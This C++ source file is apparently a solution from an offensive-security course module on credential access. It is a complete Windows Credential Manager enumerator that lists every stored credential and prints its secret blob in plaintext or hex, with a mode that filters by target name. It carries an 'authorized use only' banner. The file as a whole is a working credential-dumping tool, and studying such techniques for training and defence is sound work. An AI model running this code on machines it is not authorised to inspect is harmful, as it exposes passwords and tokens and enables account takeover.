/*
 * Solution 03 — Windows Credential Manager Enumerator (Complete)
 * Module 11: Credential Access
 *
 * Enumerates all stored credentials from Windows Credential Manager,
 * printing every field of interest including the secret blob.
 *
 * Modes:
 *   sol03.exe list             -- print all stored credentials
 *   sol03.exe search <term>    -- print credentials whose TargetName contains <term>
 *
 * Compile:
 *   g++ -std=c++17 -Wall -o sol03.exe sol03_credmanager.cpp -ladvapi32
 *
 * AUTHORIZED USE ONLY — run against your own user session.
 */

#include <windows.h>
#include <wincred.h>
#include <stdio.h>
#include <string>
#include <algorithm>

#pragma comment(lib, "advapi32.lib")

// ============================================================================
// Helpers
// ============================================================================

// Map DWORD credential type to human name.
static const char* CredTypeName(DWORD type) {
    switch (type) {
        case CRED_TYPE_GENERIC:                 return "GENERIC";
        case CRED_TYPE_DOMAIN_PASSWORD:         return "DOMAIN_PASSWORD";
        case CRED_TYPE_DOMAIN_CERTIFICATE:      return "DOMAIN_CERTIFICATE";
        case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return "DOMAIN_VISIBLE_PASSWORD";
        case CRED_TYPE_GENERIC_CERTIFICATE:     return "GENERIC_CERTIFICATE";
        default:                                return "UNKNOWN";
    }
}

// Map DWORD persist value to human name.
static const char* PersistName(DWORD persist) {
    switch (persist) {
        case CRED_PERSIST_SESSION:       return "SESSION";
        case CRED_PERSIST_LOCAL_MACHINE: return "LOCAL_MACHINE";
        case CRED_PERSIST_ENTERPRISE:    return "ENTERPRISE";
        default:                         return "UNKNOWN";
    }
}

// Convert a FILETIME to a human-readable UTC date string.
// Returns "N/A" for an all-zero FILETIME.
static std::string FiletimeToString(FILETIME ft) {
    if (ft.dwHighDateTime == 0 && ft.dwLowDateTime == 0) return "N/A";

    SYSTEMTIME st = {0};
    FileTimeToSystemTime(&ft, &st);

    char buf[64];
    snprintf(buf, sizeof(buf), "%04d-%02d-%02d %02d:%02d:%02d UTC",
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);
    return buf;
}

// True if every byte in [d, d+n) is printable ASCII (0x20..0x7E).
static bool IsPrintableA(const BYTE* d, DWORD n) {
    for (DWORD i = 0; i < n; i++)
        if (d[i] < 0x20 || d[i] > 0x7E) return false;
    return true;
}

// Return true if every WCHAR in the blob is in the printable BMP range.
static bool LooksLikeUtf16(const BYTE* d, DWORD n) {
    if (n < 2 || n % 2 != 0) return false;
    const WCHAR* w = (const WCHAR*)d;
    DWORD chars = n / sizeof(WCHAR);
    for (DWORD i = 0; i < chars; i++)
        if (w[i] < 0x0020 || w[i] > 0xFFFD) return false;
    return true;
}

// Detect known blob magic patterns.
static std::string DetectBlobType(const BYTE* d, DWORD n) {
    if (n < 4) return "";
    // DPAPI blob starts with 0x01 0x00 0x00 0x00
    if (d[0] == 0x01 && d[1] == 0x00 && d[2] == 0x00 && d[3] == 0x00)
        return " [DPAPI blob]";
    // Chrome v10/v11 AES-GCM blob
    if (n >= 3 && d[0] == 'v' && d[1] == '1' && (d[2] == '0' || d[2] == '1'))
        return " [Chrome v1x AES-GCM]";
    return "";
}

// Case-insensitive substring search.
static bool ContainsCI(const char* haystack, const char* needle) {
    if (!haystack || !needle) return false;
    std::string h(haystack), n(needle);
    std::transform(h.begin(), h.end(), h.begin(), ::tolower);
    std::transform(n.begin(), n.end(), n.begin(), ::tolower);
    return h.find(n) != std::string::npos;
}

// ============================================================================
// PrintCredential — full formatted dump of one CREDENTIAL entry
// ============================================================================
static void PrintCredential(const CREDENTIALA* cred, int index) {
    printf("\n[%d] =========================================\n", index);

    // TargetName
    printf("  TargetName    : %s\n",
           cred->TargetName ? cred->TargetName : "(null)");

    // TargetAlias (may be NULL or empty)
    if (cred->TargetAlias && strlen(cred->TargetAlias) > 0)
        printf("  TargetAlias   : %s\n", cred->TargetAlias);

    // Type
    printf("  Type          : %lu (%s)\n", cred->Type, CredTypeName(cred->Type));

    // UserName
    printf("  UserName      : %s\n",
           (cred->UserName && strlen(cred->UserName) > 0) ? cred->UserName : "(none)");

    // Persistence
    printf("  Persist       : %s\n", PersistName(cred->Persist));

    // Last written
    printf("  LastWritten   : %s\n", FiletimeToString(cred->LastWritten).c_str());

    // Attributes count
    printf("  Attributes    : %lu custom attribute(s)\n", cred->AttributeCount);

    // CredentialBlob
    DWORD blobSize = cred->CredentialBlobSize;
    BYTE* blobData = cred->CredentialBlob;

    printf("  BlobSize      : %lu bytes", blobSize);
    if (blobSize > 0) {
        std::string detection = DetectBlobType(blobData, blobSize);
        printf("%s", detection.c_str());
    }
    printf("\n");

    if (blobSize == 0) {
        printf("  Blob          : [no blob stored]\n");
        return;
    }

    // Prefer UTF-16 rendering for DOMAIN_PASSWORD (Windows stores password as UTF-16LE)
    if (cred->Type == CRED_TYPE_DOMAIN_PASSWORD && LooksLikeUtf16(blobData, blobSize)) {
        DWORD wchars = blobSize / sizeof(WCHAR);
        wprintf(L"  Blob (UTF-16) : %.*s\n", (int)wchars, (WCHAR*)blobData);
        return;
    }

    // Try as printable ASCII
    if (IsPrintableA(blobData, blobSize)) {
        printf("  Blob (ASCII)  : %.*s\n", (int)blobSize, (char*)blobData);
        return;
    }

    // Try UTF-16 heuristic for other types
    if (LooksLikeUtf16(blobData, blobSize)) {
        DWORD wchars = blobSize / sizeof(WCHAR);
        wprintf(L"  Blob (UTF-16) : %.*s\n", (int)wchars, (WCHAR*)blobData);
        return;
    }

    // Fall back to hex dump
    DWORD showMax = (blobSize < 64) ? blobSize : 64;
    printf("  Blob (hex)    : ");
    for (DWORD i = 0; i < showMax; i++) {
        printf("%02X", blobData[i]);
        if ((i+1) % 16 == 0 && i+1 < showMax) printf("\n                  ");
    }
    if (blobSize > 64) printf(" ... (+%lu more bytes)", blobSize - 64);
    printf("\n");
}

// ============================================================================
// Enumerate and optionally filter credentials
// ============================================================================
static int EnumerateCreds(const char* searchTerm) {
    DWORD          count   = 0;
    PCREDENTIALA*  ppCreds = NULL;

    BOOL ok = CredEnumerateA(NULL, 0, &count, &ppCreds);
    if (!ok) {
        DWORD err = GetLastError();
        if (err == ERROR_NOT_FOUND) {
            printf("[*] Credential Manager is empty.\n");
            return 0;
        }
        printf("[!] CredEnumerateA failed: %lu\n", err);
        return 1;
    }

    printf("[*] Total entries in Credential Manager: %lu\n", count);
    if (searchTerm)
        printf("[*] Filtering by TargetName containing: \"%s\"\n", searchTerm);

    int displayed = 0;
    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALA cred = ppCreds[i];
        if (searchTerm && !ContainsCI(cred->TargetName, searchTerm))
            continue;
        PrintCredential(cred, ++displayed);
    }

    if (displayed == 0) {
        printf("[*] No credentials matched the filter.\n");
    } else {
        printf("\n[*] Displayed %d / %lu credential(s).\n", displayed, count);
    }

    CredFree(ppCreds);
    return 0;
}

// ============================================================================
// main
// ============================================================================
int main(int argc, char* argv[]) {
    printf("=== Solution 03: Windows Credential Manager Enumerator ===\n");
    printf("AUTHORIZED USE ONLY — your own user session.\n\n");

    if (argc < 2) {
        printf("Usage:\n");
        printf("  sol03.exe list             -- list all stored credentials\n");
        printf("  sol03.exe search <term>    -- filter by TargetName\n");
        return 1;
    }

    if (_stricmp(argv[1], "list") == 0) {
        return EnumerateCreds(NULL);
    }

    if (_stricmp(argv[1], "search") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Usage: sol03.exe search <term>\n");
            return 1;
        }
        return EnumerateCreds(argv[2]);
    }

    fprintf(stderr, "[!] Unknown mode: %s\n", argv[1]);
    return 1;
}
